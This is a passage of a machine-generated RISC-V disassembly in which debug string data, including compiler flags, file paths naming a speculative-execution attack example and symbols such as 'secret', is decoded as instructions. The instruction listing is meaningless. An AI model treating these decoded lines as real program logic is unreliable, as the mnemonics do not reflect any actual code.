 236:	0030                	addi	a2,sp,8
 238:	6c66                	ld	s8,88(sp)
 23a:	7375                	lui	t1,0xffffd
 23c:	4368                	lw	a0,68(a4)
 23e:	6361                	lui	t1,0x18
 240:	6568                	ld	a0,200(a0)
 242:	5f00                	lw	s0,56(a4)
 244:	6e676973          	csrrsi	s2,0x6e6,14
 248:	6c61                	lui	s8,0x18
 24a:	625f 6675 5f00      	0x5f006675625f
 250:	7361                	lui	t1,0xffff8
 252:	6d697463          	bleu	s6,s2,91a <_tbss_end+0x896>
 256:	5f65                	li	t5,-7
 258:	7562                	ld	a0,56(sp)
 25a:	0066                	c.slli	zero,0x19
 25c:	725f 7365 6c75      	0x6c757365725f
 262:	0074                	addi	a3,sp,12
 264:	5f5f 6377 0068      	0x6863775f5f
 26a:	746e6977          	0x746e6977
 26e:	745f 5f00 6f6c      	0x6f6c5f00745f
 274:	5f006b63          	bltu	zero,a6,86a <_tbss_end+0x7e6>
 278:	6c66                	ld	s8,88(sp)
 27a:	6761                	lui	a4,0x18
 27c:	5f003273          	csrrc	tp,0x5f0,zero
 280:	74697277          	0x74697277
 284:	0065                	c.nop	25
 286:	20554e47          	fmsub.s	ft8,fa0,ft5,ft4,rmm
 28a:	20313143          	fmadd.s	ft2,ft2,ft3,ft4,rup
 28e:	2e322e37          	lui	t3,0x2e322
 292:	2030                	fld	fa2,64(s0)
 294:	6d2d                	lui	s10,0xb
 296:	646f6d63          	bltu	t5,t1,8f0 <_tbss_end+0x86c>
 29a:	6c65                	lui	s8,0x19
 29c:	6d3d                	lui	s10,0xf
 29e:	6465                	lui	s0,0x19
 2a0:	6e61                	lui	t3,0x18
 2a2:	2079                	0x2079
 2a4:	6d2d                	lui	s10,0xb
 2a6:	7261                	lui	tp,0xffff8
 2a8:	723d6863          	bltu	s10,gp,9d8 <_tbss_end+0x954>
 2ac:	3676                	fld	fa2,376(sp)
 2ae:	6934                	ld	a3,80(a0)
 2b0:	616d                	addi	sp,sp,240
 2b2:	6466                	ld	s0,88(sp)
 2b4:	6d2d2063          	0x6d2d2063
 2b8:	6261                	lui	tp,0x18
 2ba:	3d69                	addiw	s10,s10,-6
 2bc:	706c                	ld	a1,224(s0)
 2be:	3436                	fld	fs0,360(sp)
 2c0:	2064                	fld	fs1,192(s0)
 2c2:	672d                	lui	a4,0xb
 2c4:	2d20                	fld	fs0,88(a0)
 2c6:	2d20304f          	0x2d20304f
 2ca:	6e66                	ld	t3,88(sp)
 2cc:	6f632d6f          	jal	s10,329c2 <_tbss_end+0x3293e>
 2d0:	6d6d                	lui	s10,0x1b
 2d2:	2d206e6f          	jal	t3,65a4 <_tbss_end+0x6520>
 2d6:	6e66                	ld	t3,88(sp)
 2d8:	75622d6f          	jal	s10,22a2e <_tbss_end+0x229aa>
 2dc:	6c69                	lui	s8,0x1a
 2de:	6974                	ld	a3,208(a0)
 2e0:	2d6e                	fld	fs10,216(sp)
 2e2:	7270                	ld	a2,224(a2)
 2e4:	6e69                	lui	t3,0x1a
 2e6:	6674                	ld	a3,200(a2)
 2e8:	6f00                	ld	s0,24(a4)
 2ea:	7475                	lui	s0,0xffffd
 2ec:	7570                	ld	a2,232(a0)
 2ee:	0074                	addi	a3,sp,12
 2f0:	72636573          	csrrsi	a0,0x726,6
 2f4:	7465                	lui	s0,0xffff9
 2f6:	5f00                	lw	s0,56(a4)
 2f8:	6d6e                	ld	s10,216(sp)
 2fa:	6c61                	lui	s8,0x18
 2fc:	6f6c                	ld	a1,216(a4)
 2fe:	6f740063          	beq	s0,s7,9de <_tbss_end+0x95a>
 302:	5470                	lw	a2,108(s0)
 304:	64496f77          	0x64496f77
 308:	0078                	addi	a4,sp,12
 30a:	6f6c                	ld	a1,216(a4)
 30c:	676e                	ld	a4,216(sp)
 30e:	6420                	ld	s0,72(s0)
 310:	6c62756f          	jal	a0,279d6 <_tbss_end+0x27952>
 314:	0065                	c.nop	25
 316:	6e5f 7865 6674      	0x667478656e5f
 31c:	7300                	ld	s0,32(a4)
 31e:	6365                	lui	t1,0x19
 320:	6572                	ld	a0,280(sp)
 322:	5374                	lw	a3,100(a4)
 324:	7274                	ld	a3,224(a2)
 326:	6e69                	lui	t3,0x1a
 328:	5f5f0067          	jr	1525(t5) # 1a5f5 <_tbss_end+0x1a571>
 32c:	6d74                	ld	a3,216(a0)
 32e:	6d5f 6e6f 5f00      	0x5f006e6f6d5f
 334:	7461                	lui	s0,0xffff8
 336:	7865                	lui	a6,0xffff9
 338:	7469                	lui	s0,0xffffa
 33a:	5f00                	lw	s0,56(a4)
 33c:	735f 6964 6964      	0x69646964735f
 342:	696e                	ld	s2,216(sp)
 344:	0074                	addi	a3,sp,12
 346:	6f5f 6666 745f      	0x745f66666f5f
 34c:	6600                	ld	s0,8(a2)
 34e:	6172                	ld	sp,280(sp)
 350:	656d                	lui	a0,0x1b
 352:	7544                	ld	s1,168(a0)
 354:	706d                	c.lui	zero,0xffffb
 356:	5f00                	lw	s0,56(a4)
 358:	755f 6e69 3674      	0x36746e69755f
 35e:	5f34                	lw	a3,120(a4)
 360:	0074                	addi	a3,sp,12
 362:	665f 6572 6c65      	0x6c656572665f
 368:	7369                	lui	t1,0xffffa
 36a:	0074                	addi	a3,sp,12
 36c:	4c5f 434f 5f4b      	0x5f4b434f4c5f
 372:	4552                	lw	a0,20(sp)
 374:	53525543          	fmadd.d	fa0,ft4,fs5,fa0,unknown
 378:	5649                	li	a2,-14
 37a:	5f45                	li	t5,-15
 37c:	0054                	addi	a3,sp,4
 37e:	756e                	ld	a0,248(sp)
 380:	536d                	li	t1,-5
 382:	7465                	lui	s0,0xffff9
 384:	656c4373          	0x656c4373
 388:	7261                	lui	tp,0xffff8
 38a:	7500                	ld	s0,40(a0)
 38c:	736e                	ld	t1,248(sp)
 38e:	6769                	lui	a4,0x1a
 390:	656e                	ld	a0,216(sp)
 392:	2064                	fld	fs1,192(s0)
 394:	72616863          	bltu	sp,t1,ac4 <_tbss_end+0xa40>
 398:	6400                	ld	s0,8(s0)
 39a:	6d75                	lui	s10,0x1d
 39c:	796d                	lui	s2,0xffffb
 39e:	654d                	lui	a0,0x13
 3a0:	006d                	c.nop	27
 3a2:	6e5f 7765 5f00      	0x5f0077656e5f
 3a8:	5f68                	lw	a0,124(a4)
 3aa:	7265                	lui	tp,0xffff9
 3ac:	6e72                	ld	t3,280(sp)
 3ae:	6873006f          	j	31234 <_tbss_end+0x311b0>
 3b2:	2074726f          	jal	tp,47db8 <_tbss_end+0x47d34>
 3b6:	6e69                	lui	t3,0x1a
 3b8:	0074                	addi	a3,sp,12
 3ba:	5f5f 6d74 795f      	0x795f6d745f5f
 3c0:	6164                	ld	s1,192(a0)
 3c2:	0079                	c.nop	30
 3c4:	5f5f 6273 6675      	0x667562735f5f
 3ca:	5f00                	lw	s0,56(a4)
 3cc:	6f69                	lui	t5,0x1a
 3ce:	7362                	ld	t1,56(sp)
 3d0:	5f00                	lw	s0,56(a4)
 3d2:	465f 4c49 0045      	0x454c49465f
 3d8:	6d5f 7362 6174      	0x617473626d5f
 3de:	6574                	ld	a3,200(a0)
 3e0:	745f 5f00 735f      	0x735f5f00745f
 3e6:	4946                	lw	s2,80(sp)
 3e8:	454c                	lw	a1,12(a0)
 3ea:	5f00                	lw	s0,56(a4)
 3ec:	626d                	lui	tp,0x1b
 3ee:	74617473          	csrrci	s0,0x746,2
 3f2:	0065                	c.nop	25
 3f4:	725f 6e61 5f64      	0x5f646e61725f
 3fa:	656e                	ld	a0,216(sp)
 3fc:	7478                	ld	a4,232(s0)
 3fe:	5f00                	lw	s0,56(a4)
 400:	626d                	lui	tp,0x1b
 402:	656c                	ld	a1,200(a0)
 404:	5f6e                	lw	t5,248(sp)
 406:	74617473          	csrrci	s0,0x746,2
 40a:	0065                	c.nop	25
 40c:	695f 636e 5f00      	0x5f00636e695f
 412:	6e69                	lui	t3,0x1a
 414:	0064                	addi	s1,sp,12
 416:	6c5f 636f 6c61      	0x6c61636f6c5f
 41c:	0065                	c.nop	25
 41e:	5f5f 6c63 6165      	0x61656c635f5f
 424:	756e                	ld	a0,248(sp)
 426:	0070                	addi	a2,sp,12
 428:	755f 736e 6570      	0x6570736e755f
 42e:	69666963          	bltu	a2,s6,ac0 <_tbss_end+0xa3c>
 432:	6465                	lui	s0,0x19
 434:	6c5f 636f 6c61      	0x6c61636f6c5f
 43a:	5f65                	li	t5,-7
 43c:	6e69                	lui	t3,0x1a
 43e:	6f66                	ld	t5,88(sp)
 440:	5f00                	lw	s0,56(a4)
 442:	616d                	addi	sp,sp,240
 444:	7778                	ld	a4,232(a4)
 446:	7364                	ld	s1,224(a4)
 448:	5f00                	lw	s0,56(a4)
 44a:	6572                	ld	a0,280(sp)
 44c:	6e65                	lui	t3,0x19
 44e:	0074                	addi	a3,sp,12
 450:	735f 6565 0064      	0x646565735f
 456:	5f5f 6f63 6e75      	0x6e756f635f5f
 45c:	0074                	addi	a3,sp,12
 45e:	5f5f 6176 756c      	0x756c61765f5f
 464:	0065                	c.nop	25
 466:	735f 6565 006b      	0x6b6565735f
 46c:	6d6f682f          	0x6d6f682f
 470:	2f65                	addiw	t5,t5,25
 472:	6e656863          	bltu	a0,t1,b62 <_tbss_end+0xade>
 476:	61697867          	0x61697867
 47a:	2f75796f          	jal	s2,57f70 <_tbss_end+0x57eec>
 47e:	63657053          	0x63657053
 482:	464c                	lw	a1,12(a2)
 484:	2f42                	fld	ft10,16(sp)
 486:	7461                	lui	s0,0xffff8
 488:	6174                	ld	a3,192(a0)
 48a:	655f6b63          	bltu	t5,s5,ae0 <_tbss_end+0xa5c>
 48e:	6578                	ld	a4,200(a0)
 490:	706d                	c.lui	zero,0xffffb
 492:	656c                	ld	a1,200(a0)
 494:	725f 7369 7663      	0x76637369725f
 49a:	5f00                	lw	s0,56(a4)
 49c:	7066                	0x7066
 49e:	745f736f          	jal	t1,f83e2 <_tbss_end+0xf835e>
 4a2:	5f00                	lw	s0,56(a4)
 4a4:	745f 5f6d 6579      	0x65795f6d745f
 4aa:	7261                	lui	tp,0xffff8
 4ac:	5f00                	lw	s0,56(a4)
 4ae:	745f 5f6d 696d      	0x696d5f6d745f
 4b4:	006e                	c.slli	zero,0x1b
 4b6:	78644963          	blt	s0,t1,c48 <_tbss_end+0xbc4>
 4ba:	6f00                	ld	s0,24(a4)
 4bc:	7475                	lui	s0,0xffffd
 4be:	6449                	lui	s0,0x12
 4c0:	4178                	lw	a4,68(a0)
 4c2:	7272                	ld	tp,312(sp)
 4c4:	7961                	lui	s2,0xffff8
 4c6:	5f00                	lw	s0,56(a4)
 4c8:	756d                	lui	a0,0xffffb
 4ca:	746c                	ld	a1,232(s0)
 4cc:	5f00                	lw	s0,56(a4)
 4ce:	74727473          	csrrci	s0,0x747,4
 4d2:	6c5f6b6f          	jal	s6,f7396 <_tbss_end+0xf7312>
 4d6:	7361                	lui	t1,0xffff8
 4d8:	0074                	addi	a3,sp,12
 4da:	665f 746e 7079      	0x7079746e665f
 4e0:	7365                	lui	t1,0xffff9
 4e2:	5f00                	lw	s0,56(a4)
 4e4:	6461                	lui	s0,0x18
 4e6:	0064                	addi	s1,sp,12
 4e8:	5f5f 4c55 6e6f      	0x6e6f4c555f5f
 4ee:	675f0067          	jr	1653(t5) # 1a675 <_tbss_end+0x1a5f1>
 4f2:	7465                	lui	s0,0xffff9
 4f4:	6164                	ld	s1,192(a0)
 4f6:	6574                	ld	a3,200(a0)
 4f8:	655f 7272 5f00      	0x5f007272655f
 4fe:	626f6c67          	0x626f6c67
 502:	6c61                	lui	s8,0x18
 504:	695f 706d 7275      	0x7275706d695f
 50a:	5f65                	li	t5,-7
 50c:	7470                	ld	a2,232(s0)
 50e:	0072                	c.slli	zero,0x1c
 510:	6c61                	lui	s8,0x18
 512:	6769                	lui	a4,0x1a
 514:	656e                	ld	a0,216(sp)
 516:	4d64                	lw	s1,92(a0)
 518:	6d65                	lui	s10,0x19
 51a:	5f00                	lw	s0,56(a4)
 51c:	6e75                	lui	t3,0x1d
 51e:	7375                	lui	t1,0xffffd
 520:	6465                	lui	s0,0x19
 522:	725f 6e61 0064      	0x646e61725f
 528:	775f 7364 5f00      	0x5f007364775f
 52e:	745f 5f6d 6477      	0x64775f6d745f
 534:	7961                	lui	s2,0xffff8
 536:	5f00                	lw	s0,56(a4)
 538:	65756c67          	0x65756c67
 53c:	5f00                	lw	s0,56(a4)
 53e:	7a697373          	csrrci	t1,0x7a6,18
 542:	5f65                	li	t5,-7
 544:	0074                	addi	a3,sp,12
 546:	6c5f 3436 5f61      	0x5f6134366c5f
 54c:	7562                	ld	a0,56(sp)
 54e:	0066                	c.slli	zero,0x19
 550:	735f 6769 665f      	0x665f6769735f
 556:	6e75                	lui	t3,0x1d
 558:	6e5f0063          	beq	t5,t0,c38 <_tbss_end+0xbb4>
 55c:	7562                	ld	a0,56(sp)
 55e:	0066                	c.slli	zero,0x19
 560:	755f 756e 6573      	0x6573756e755f
 566:	0064                	addi	s1,sp,12
 568:	5f5f 6d74 695f      	0x695f6d745f5f
 56e:	74736473          	csrrsi	s0,0x747,6
 572:	5f00                	lw	s0,56(a4)
 574:	6f6c                	ld	a1,216(a4)
 576:	746c6163          	bltu	s8,t1,cb8 <_tbss_end+0xc34>
 57a:	6d69                	lui	s10,0x1a
 57c:	5f65                	li	t5,-7
 57e:	7562                	ld	a0,56(sp)
 580:	0066                	c.slli	zero,0x19
 582:	635f 6f6c 6573      	0x65736f6c635f
 588:	5f00                	lw	s0,56(a4)
 58a:	3472                	fld	fs0,312(sp)
 58c:	0038                	addi	a4,sp,8
 58e:	72617473          	csrrci	s0,0x726,2
 592:	0074                	addi	a3,sp,12
 594:	6d5f 7462 776f      	0x776f74626d5f
 59a:	74735f63          	ble	t2,t1,cf8 <_tbss_end+0xc74>
 59e:	7461                	lui	s0,0xffff8
 5a0:	0065                	c.nop	25
 5a2:	6572                	ld	a0,280(sp)
 5a4:	746c7573          	csrrci	a0,0x746,24
 5a8:	705f0073          	0x705f0073
 5ac:	7335                	lui	t1,0xfffed
 5ae:	6d00                	ld	s0,24(a0)
 5b0:	6961                	lui	s2,0x18
 5b2:	006e                	c.slli	zero,0x1b
 5b4:	5f5f 6d74 6d5f      	0x6d5f6d745f5f
 5ba:	6164                	ld	s1,192(a0)
 5bc:	0079                	c.nop	30
 5be:	63657073          	csrci	0x636,10
 5c2:	7546                	ld	a0,112(sp)
 5c4:	636e                	ld	t1,216(sp)
 5c6:	7300                	ld	s0,32(a4)
 5c8:	6372                	ld	t1,280(sp)
 5ca:	7472632f          	0x7472632f
 5ce:	532e                	lw	t1,232(sp)
 5d0:	2f00                	fld	fs0,24(a4)
 5d2:	6f68                	ld	a0,216(a4)
 5d4:	656d                	lui	a0,0x1b
 5d6:	6568632f          	0x6568632f
 5da:	676e                	ld	a4,216(sp)
 5dc:	6978                	ld	a4,208(a0)
 5de:	6f61                	lui	t5,0x18
 5e0:	7579                	lui	a0,0xffffe
 5e2:	6570532f          	0x6570532f
 5e6:	42464c63          	blt	a2,tp,a1e <_tbss_end+0x99a>
 5ea:	7474612f          	0x7474612f
 5ee:	6361                	lui	t1,0x18
 5f0:	7865206b          	0x7865206b
 5f4:	6d65                	lui	s10,0x19
 5f6:	6c70                	ld	a2,216(s0)
 5f8:	0065                	c.nop	25
 5fa:	20554e47          	fmsub.s	ft8,fa0,ft5,ft4,rmm
 5fe:	5341                	li	t1,-16
 600:	3220                	fld	fs0,96(a2)
 602:	322e                	fld	ft4,232(sp)
 604:	0039                	c.nop	14
 606:	2f637273          	csrrci	tp,0x2f6,6
 60a:	63617473          	csrrci	s0,0x636,2
 60e:	00532e6b          	0x532e6b
 612:	616e                	ld	sp,216(sp)
 614:	656d                	lui	a0,0x1b
 616:	5f00                	lw	s0,56(a4)
 618:	6c74                	ld	a3,216(s0)
 61a:	61645f73          	csrrwi	t5,0x616,8
 61e:	6174                	ld	a3,192(a0)
 620:	7300                	ld	s0,32(a4)
 622:	7274                	ld	a3,224(a2)
 624:	656c                	ld	a1,200(a0)
 626:	006e                	c.slli	zero,0x1b
 628:	7270                	ld	a2,224(a2)
 62a:	6e69                	lui	t3,0x1a
 62c:	4174                	lw	a3,68(a0)
 62e:	7272                	ld	tp,312(sp)
 630:	7961                	lui	s2,0xffff8
 632:	6300                	ld	s0,0(a4)
 634:	7561                	lui	a0,0xffff8
 636:	73006573          	csrrsi	a0,0x730,0
 63a:	7274                	ld	a3,224(a2)
 63c:	6c6e                	ld	s8,216(sp)
 63e:	6e65                	lui	t3,0x19
 640:	7000                	ld	s0,32(s0)
 642:	6f72                	ld	t5,280(sp)
 644:	73736563          	bltu	t1,s7,d6e <_tbss_end+0xcea>
 648:	705f 6572 6963      	0x69636572705f
 64e:	6e6f6973          	csrrsi	s2,0x6e6,30
 652:	7400                	ld	s0,40(s0)
 654:	6164                	ld	s1,192(a0)
 656:	6174                	ld	a3,192(a0)
 658:	735f 7a69 0065      	0x657a69735f
 65e:	745f 6164 6174      	0x61746164745f
 664:	655f 646e 6700      	0x6700646e655f
 66a:	7465                	lui	s0,0xffff9
 66c:	6975                	lui	s2,0x1d
 66e:	746e                	ld	s0,248(sp)
 670:	7000                	ld	s0,32(s0)
 672:	7475                	lui	s0,0xffffd
 674:	72616863          	bltu	sp,t1,da4 <_tbss_end+0xd20>
 678:	7200                	ld	s0,32(a2)
 67a:	6765                	lui	a4,0x19
 67c:	72700073          	0x72700073
 680:	6e69                	lui	t3,0x1a
 682:	7374                	ld	a3,224(a4)
 684:	7274                	ld	a3,224(a2)
 686:	6200                	ld	s0,0(a2)
 688:	7261                	lui	tp,0xffff8
 68a:	6972                	ld	s2,280(sp)
 68c:	7265                	lui	tp,0xffff9
 68e:	6800                	ld	s0,16(s0)
 690:	6e61                	lui	t3,0x18
 692:	6c64                	ld	s1,216(s0)
 694:	5f65                	li	t5,-7
 696:	7274                	ld	a3,224(a2)
 698:	7061                	c.lui	zero,0xffff8
 69a:	7400                	ld	s0,40(s0)
 69c:	7268                	ld	a0,224(a2)
 69e:	6165                	addi	sp,sp,112
 6a0:	5f64                	lw	s1,124(a4)
 6a2:	6e65                	lui	t3,0x19
 6a4:	7274                	ld	a3,224(a2)
 6a6:	0079                	c.nop	30
 6a8:	63727473          	csrrci	s0,0x637,4
 6ac:	7970                	ld	a2,240(a0)
 6ae:	7000                	ld	s0,32(s0)
 6b0:	6972                	ld	s2,280(sp)
 6b2:	746e                	ld	s0,248(sp)
 6b4:	756e                	ld	a0,248(sp)
 6b6:	006d                	c.nop	27
 6b8:	6e65                	lui	t3,0x19
 6ba:	6261                	lui	tp,0x18
 6bc:	656c                	ld	a1,200(a0)
 6be:	6100                	ld	s0,0(a0)
 6c0:	6f62                	ld	t5,24(sp)
 6c2:	7472                	ld	s0,312(sp)
 6c4:	5f00                	lw	s0,56(a4)
 6c6:	675f 756e 5f63      	0x5f63756e675f
 6cc:	6176                	ld	sp,344(sp)
 6ce:	6c5f 7369 0074      	0x7473696c5f
 6d4:	6170                	ld	a2,192(a0)
 6d6:	6364                	ld	s1,192(a4)
 6d8:	7300                	ld	s0,32(a4)
 6da:	6372                	ld	t1,280(sp)
 6dc:	7379732f          	0x7379732f
 6e0:	6c6c6163          	bltu	s8,t1,da2 <_tbss_end+0xd1e>
 6e4:	00632e73          	csrrs	t3,0x6,t1
 6e8:	74646977          	0x74646977
 6ec:	0068                	addi	a0,sp,12
 6ee:	30727473          	csrrci	s0,0x307,4
 6f2:	6300                	ld	s0,0(a4)
 6f4:	746e756f          	jal	a0,e7e3a <_tbss_end+0xe7db6>
 6f8:	7265                	lui	tp,0xffff9
 6fa:	6f630073          	0x6f630073
 6fe:	6564                	ld	s1,200(a0)
 700:	6c00                	ld	s0,24(s0)
 702:	7366                	ld	t1,120(sp)
 704:	0072                	c.slli	zero,0x1c
 706:	6d6f682f          	0x6d6f682f
 70a:	2f65                	addiw	t5,t5,25
 70c:	6e656863          	bltu	a0,t1,dfc <_tbss_end+0xd78>
 710:	61697867          	0x61697867
 714:	2f75796f          	jal	s2,5820a <_tbss_end+0x58186>
 718:	70696863          	bltu	s2,t1,e28 <_tbss_end+0xda4>
 71c:	6179                	addi	sp,sp,464
 71e:	6472                	ld	s0,280(sp)
 720:	6d69732f          	0x6d69732f
 724:	74612f73          	csrrs	t5,0x746,sp
 728:	6174                	ld	a3,192(a0)
 72a:	00316b63          	bltu	sp,gp,740 <_tbss_end+0x6bc>
 72e:	616c                	ld	a1,192(a0)
 730:	665f7473          	csrrci	s0,0x665,30
 734:	746d                	lui	s0,0xffffb
 736:	6200                	ld	s0,0(a2)
 738:	6675                	lui	a2,0x1d
 73a:	656c                	ld	a1,200(a0)
 73c:	006e                	c.slli	zero,0x1b
 73e:	6572                	ld	a0,280(sp)
 740:	74697773          	csrrci	a4,0x746,18
 744:	73006863          	bltu	zero,a6,e74 <_tbss_end+0xdf0>
 748:	7274                	ld	a3,224(a2)
 74a:	00706d63          	bltu	zero,t2,764 <_tbss_end+0x6e0>
 74e:	7270                	ld	a2,224(a2)
 750:	6e69                	lui	t3,0x1a
 752:	4474                	lw	a3,76(s0)
 754:	6c62756f          	jal	a0,27e1a <_tbss_end+0x27d96>
 758:	4165                	li	sp,25
 75a:	7272                	ld	tp,312(sp)
 75c:	7961                	lui	s2,0xffff8
 75e:	6c00                	ld	s0,24(s0)
 760:	6c66                	ld	s8,88(sp)
 762:	6761                	lui	a4,0x18
 764:	7000                	ld	s0,32(s0)
 766:	00727473          	csrrci	s0,0x7,4
 76a:	656d                	lui	a0,0x1b
 76c:	736d                	lui	t1,0xffffb
 76e:	7465                	lui	s0,0xffff9
 770:	6100                	ld	s0,0(a0)
 772:	6772                	ld	a4,280(sp)
 774:	0030                	addi	a2,sp,8
 776:	7261                	lui	tp,0xffff8
 778:	61003167          	0x61003167
 77c:	6772                	ld	a4,280(sp)
 77e:	0032                	c.slli	zero,0xc
 780:	695f 696e 0074      	0x74696e695f
 786:	63737973          	csrrci	s2,0x637,6
 78a:	6c61                	lui	s8,0x18
 78c:	006c                	addi	a1,sp,12
 78e:	6576                	ld	a0,344(sp)
 790:	6972                	ld	s2,280(sp)
 792:	7966                	ld	s2,120(sp)
 794:	6f44                	ld	s1,152(a4)
 796:	6275                	lui	tp,0x1d
 798:	656c                	ld	a1,200(a0)
 79a:	6700                	ld	s0,8(a4)
 79c:	7465                	lui	s0,0xffff9
 79e:	6e69                	lui	t3,0x1a
 7a0:	0074                	addi	a3,sp,12
 7a2:	6e75                	lui	t3,0x1d
 7a4:	6e676973          	csrrsi	s2,0x6e6,14
 7a8:	6465                	lui	s0,0x19
 7aa:	6e5f 6d75 6562      	0x65626d756e5f
 7b0:	0072                	c.slli	zero,0x1c
 7b2:	7570                	ld	a2,232(a0)
 7b4:	6474                	ld	a3,200(s0)
 7b6:	7461                	lui	s0,0xffff8
 7b8:	6100                	ld	s0,0(a0)
 7ba:	6772                	ld	a4,280(sp)
 7bc:	68770063          	beq	a4,t2,e3c <_tbss_end+0xdb8>
 7c0:	6369                	lui	t1,0x1a
 7c2:	0068                	addi	a0,sp,12
 7c4:	7261                	lui	tp,0xffff8
 7c6:	73007667          	0x73007667
 7ca:	7270                	ld	a2,224(a2)
 7cc:	6e69                	lui	t3,0x1a
 7ce:	6674                	ld	a3,200(a2)
 7d0:	5f00                	lw	s0,56(a4)
 7d2:	6474                	ld	a3,200(s0)
 7d4:	7461                	lui	s0,0xffff8
 7d6:	5f61                	li	t5,-8
 7d8:	6562                	ld	a0,24(sp)
 7da:	006e6967          	0x6e6967
 7de:	636e                	ld	t1,216(sp)
 7e0:	7365726f          	jal	tp,57f16 <_tbss_end+0x57e92>
 7e4:	5f00                	lw	s0,56(a4)
 7e6:	755f 6e69 7074      	0x70746e69755f
 7ec:	7274                	ld	a3,224(a2)
 7ee:	745f 6100 746c      	0x746c6100745f
 7f4:	6c66                	ld	s8,88(sp)
 7f6:	6761                	lui	a4,0x18
 7f8:	7400                	ld	s0,40(s0)
 7fa:	7362                	ld	t1,56(sp)
 7fc:	69735f73          	csrrwi	t5,0x697,6
 800:	657a                	ld	a0,408(sp)
 802:	7400                	ld	s0,40(s0)
 804:	7268                	ld	a0,224(a2)
 806:	6165                	addi	sp,sp,112
 808:	5f64                	lw	s1,124(a4)
 80a:	6f70                	ld	a2,216(a4)
 80c:	6e69                	lui	t3,0x1a
 80e:	6574                	ld	a3,200(a0)
 810:	0072                	c.slli	zero,0x1c
 812:	6e756f63          	bltu	a0,t2,f10 <_tbss_end+0xe8c>
 816:	6574                	ld	a3,200(a0)
 818:	5f72                	lw	t5,60(sp)
 81a:	616e                	ld	sp,216(sp)
 81c:	656d                	lui	a0,0x1b
 81e:	6f770073          	0x6f770073
 822:	6472                	ld	s0,280(sp)
 824:	5f00                	lw	s0,56(a4)
 826:	6274                	ld	a3,192(a2)
 828:	655f7373          	csrrci	t1,0x655,30
 82c:	646e                	ld	s0,216(sp)
 82e:	4700                	lw	s0,8(a4)
 830:	554e                	lw	a0,240(sp)
 832:	4320                	lw	s0,64(a4)
 834:	3731                	addiw	a4,a4,-20
 836:	3920                	fld	fs0,112(a0)
 838:	322e                	fld	ft4,232(sp)
 83a:	302e                	fld	ft0,232(sp)
 83c:	2d20                	fld	fs0,88(a0)
 83e:	636d                	lui	t1,0x1b
 840:	6f6d                	lui	t5,0x1b
 842:	6564                	ld	s1,200(a0)
 844:	3d6c                	fld	fa1,248(a0)
 846:	656d                	lui	a0,0x1b
 848:	6164                	ld	s1,192(a0)
 84a:	796e                	ld	s2,248(sp)
 84c:	2d20                	fld	fs0,88(a0)
 84e:	746d                	lui	s0,0xffffb
 850:	6e75                	lui	t3,0x1d
 852:	3d65                	addiw	s10,s10,-7
 854:	6f72                	ld	t5,280(sp)
 856:	74656b63          	bltu	a0,t1,fac <_tbss_end+0xf28>
 85a:	2d20                	fld	fs0,88(a0)
 85c:	616d                	addi	sp,sp,240
 85e:	6372                	ld	t1,280(sp)
 860:	3d68                	fld	fa0,248(a0)
 862:	7672                	ld	a2,312(sp)
 864:	3436                	fld	fs0,360(sp)
 866:	6d69                	lui	s10,0x1a
 868:	6661                	lui	a2,0x18
 86a:	6364                	ld	s1,192(a4)
 86c:	2d20                	fld	fs0,88(a0)
 86e:	616d                	addi	sp,sp,240
 870:	6962                	ld	s2,24(sp)
 872:	6c3d                	lui	s8,0xf
 874:	3670                	fld	fa2,232(a2)
 876:	6434                	ld	a3,72(s0)
 878:	2d20                	fld	fs0,88(a0)
 87a:	4f2d2067          	0x4f2d2067
 87e:	2030                	fld	fa2,64(s0)
 880:	662d                	lui	a2,0xb
 882:	6f6e                	ld	t5,216(sp)
 884:	632d                	lui	t1,0xb
 886:	6f6d6d6f          	jal	s10,d6f7c <_tbss_end+0xd6ef8>
 88a:	206e                	fld	ft0,216(sp)
 88c:	662d                	lui	a2,0xb
 88e:	6f6e                	ld	t5,216(sp)
 890:	622d                	lui	tp,0xb
 892:	6975                	lui	s2,0x1d
 894:	746c                	ld	a1,232(s0)
 896:	6e69                	lui	t3,0x1a
 898:	702d                	c.lui	zero,0xfffeb
 89a:	6972                	ld	s2,280(sp)
 89c:	746e                	ld	s0,248(sp)
 89e:	0066                	c.slli	zero,0x19
 8a0:	6f74                	ld	a3,216(a4)
 8a2:	6f68                	ld	a0,216(a4)
 8a4:	64007473          	csrrci	s0,0x640,0
 8a8:	6769                	lui	a4,0x1a
 8aa:	70730073          	0x70730073
 8ae:	6972                	ld	s2,280(sp)
 8b0:	746e                	ld	s0,248(sp)
 8b2:	5f66                	lw	t5,120(sp)
 8b4:	7570                	ld	a2,232(a0)
 8b6:	6374                	ld	a3,192(a4)
 8b8:	0068                	addi	a0,sp,12
 8ba:	7962                	ld	s2,56(sp)
 8bc:	6574                	ld	a3,200(a0)
 8be:	7000                	ld	s0,32(s0)
 8c0:	6972                	ld	s2,280(sp)
 8c2:	746e                	ld	s0,248(sp)
 8c4:	6568                	ld	a0,200(a0)
 8c6:	0078                	addi	a4,sp,12
 8c8:	6874                	ld	a3,208(s0)
 8ca:	6572                	ld	a0,280(sp)
 8cc:	6461                	lui	s0,0x18
 8ce:	736e6573          	csrrsi	a0,0x736,28
 8d2:	0065                	c.nop	25
 8d4:	6574                	ld	a3,200(a0)
 8d6:	70007473          	csrrci	s0,0x700,0
 8da:	7562                	ld	a0,56(sp)
 8dc:	0066                	c.slli	zero,0x19
 8de:	616d                	addi	sp,sp,240
 8e0:	5f636967          	0x5f636967
 8e4:	656d                	lui	a0,0x1b
 8e6:	006d                	c.nop	27
 8e8:	6f74                	ld	a3,216(a4)
 8ea:	6f68                	ld	a0,216(a4)
 8ec:	655f7473          	csrrci	s0,0x655,30
 8f0:	6978                	ld	a4,208(a0)
 8f2:	0074                	addi	a3,sp,12
 8f4:	7266                	ld	tp,120(sp)
 8f6:	6f686d6f          	jal	s10,86fec <_tbss_end+0x86f68>
 8fa:	6d007473          	csrrci	s0,0x6d0,0
 8fe:	6d65                	lui	s10,0x19
 900:	00797063          	bleu	t2,s2,900 <_tbss_end+0x87c>
 904:	5f5f 7562 6c69      	0x6c6975625f5f
 90a:	6974                	ld	a3,208(a0)
 90c:	5f6e                	lw	t5,248(sp)
 90e:	6176                	ld	sp,344(sp)
 910:	6c5f 7369 0074      	0x7473696c5f
 916:	7461                	lui	s0,0xffff8
 918:	73006c6f          	jal	s8,7048 <_tbss_end+0x6fc4>
 91c:	7465                	lui	s0,0xffff9
 91e:	74617453          	0x74617453
 922:	6e690073          	0x6e690073
 926:	7469                	lui	s0,0xffffa
 928:	745f 736c 7600      	0x7600736c745f
 92e:	7265                	lui	tp,0xffff9
 930:	6669                	lui	a2,0x1a
